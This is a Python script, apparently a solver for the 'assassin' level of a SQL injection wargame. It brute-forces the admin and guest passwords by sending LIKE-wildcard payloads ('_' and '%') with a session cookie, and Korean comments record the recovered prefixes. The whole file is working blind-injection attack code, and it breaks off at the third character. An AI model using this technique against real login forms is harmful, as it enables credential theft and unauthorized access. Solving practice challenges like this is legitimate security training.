import string
import requests

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
params={"pw" : None}
cookies = {"PHPSESSID" : "1t87momi7f10m7tl6kkv6t0lob"}

#패스워드 길이 구하기
for i in range(30):
    payload="_"*i
    params["pw"]=payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print(i,response.text[:300])
    if("Hello guest" in response.text):
        print(i,response.text[:300])

# admin, guest 둘다 비밀번호 8자리
# 첫 글자 구하기
for i in string.printable:
    payload="{}%".format(i)
    params["pw"]=payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print(i,response.text[:300])
    if("Hello guest" in response.text):
        print(i,response.text[:300])

# guest,admin 둘다 첫글자가 9

# 두번째 글자 구하기
for i in string.printable:
    payload= "9{}%".format(i)
    params["pw"]=payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print(i,response.text[:300])
    if("Hello guest" in response.text):
        print(i,response.text[:300])

# guest,admin 둘다 90

# 세번째 글자 구하기
for i in string.printable:
    payload= "90{}%".format(i)
    params["pw"]=payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print(i,response.text[:300])
    if("Hello guest" in response.text):
        print(i,response.text[:300])

# 세번째 글자에서 admin은 902, guest는 90d로 차이 
# 


